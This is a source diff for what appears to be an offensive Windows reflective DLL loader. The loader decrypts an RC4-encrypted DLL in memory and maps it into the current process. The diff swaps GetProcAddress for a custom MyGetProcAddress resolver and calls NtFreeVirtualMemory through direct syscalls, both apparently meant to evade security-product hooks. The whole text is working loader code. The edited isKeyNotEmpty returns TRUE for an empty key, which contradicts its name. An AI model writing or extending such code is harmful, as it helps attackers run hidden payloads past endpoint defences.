@@ -1,5 +1,6 @@
 #include "prototype.h"
 #include "crypto.h"
+#include "MyGetProcAddress.h"
 
 
 #define FileDirectoryInformation 1
@@ -33,11 +34,11 @@ void BuildDllPath(const char* userPath) {
 }
 
 BOOL isKeyNotEmpty() {
-    if (key[0] == "\0") {
+    if (key[0] == '\0') {
 		/*printf("[*] Empty decryption key\n");*/
-        return FALSE;
+        return TRUE;
     }
-	return TRUE;
+	return FALSE;
 }
 
 void help() {
@@ -113,6 +114,7 @@ extern "C" {
 #ifdef __cplusplus
 }
 #endif
+
 
 // -----------------------------
 // Reflective DLL Load to Current Process
@@ -221,7 +223,7 @@ void RDL() {
             rc4_crypt(state, (unsigned char*)dllBytes, bytesRead);
             printf("[+] DLL decrypted in memory, Key=%s\n", key);
         } else {
-			printf("[*] No decryption key provided, assuming DLL is not encrypted\n");
+			printf("[!] No decryption key provided, assuming DLL is not encrypted\n");
 		}
 
     }
@@ -350,13 +352,34 @@ void RDL() {
                 if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                 {
                     LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
-                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
+                    thunk->u1.Function = (DWORD_PTR)MyGetProcAddress(library, functionOrdinal,MAX_FORWARDER_CHAIN);
+                   
+                    // check mismatch with GetProcaddress
+                    /*FARPROC myAddr = MyGetProcAddress(library, functionOrdinal, MAX_FORWARDER_CHAIN);
+                    FARPROC realAddr = GetProcAddress(library, functionOrdinal);*/
+
+                    /*if (myAddr != realAddr) {
+                        printf("[!] MISMATCH: %s - Mine: %p, Real: %p\n",
+                            functionOrdinal, myAddr, realAddr);
+                        
+                    }
+                    thunk->u1.Function = (DWORD_PTR)myAddr;*/
+
+                    
                 }
                 else
                 {
                     PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)remoteImage + thunk->u1.AddressOfData);
-                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
+                    DWORD_PTR functionAddress = (DWORD_PTR)MyGetProcAddress(library, functionName->Name,MAX_FORWARDER_CHAIN);
                     thunk->u1.Function = functionAddress;
+                   /* FARPROC myAddr = MyGetProcAddress(library, functionName->Name, MAX_FORWARDER_CHAIN);
+                    FARPROC realAddr = GetProcAddress(library, functionName->Name);
+
+                    if (myAddr != realAddr) {
+                        printf("[!] MISMATCH: %s - Mine: %p, Real: %p\n",
+                            functionName->Name, myAddr, realAddr);
+                    }
+                    thunk->u1.Function = (DWORD_PTR)myAddr;*/
                 }
                 ++thunk;
             }
@@ -426,7 +449,7 @@ BOOL GetPIDDebug(PTARGET_INFO pTargetInfo) {
     }
 
     SIZE_T regionSize = len;
-    status = SysNtFreeVirtualMemory(GetCurrentProcess(), &buffer, &regionSize, MEM_RELEASE);
+    status = SysNtFreeVirtualMemory((HANDLE) - 1, &buffer, &regionSize, MEM_RELEASE);
     if (status != STATUS_SUCCESS) {
         printf("[-] SysNtFreeVirtualMemory failed: 0x%X\n", status);
     }
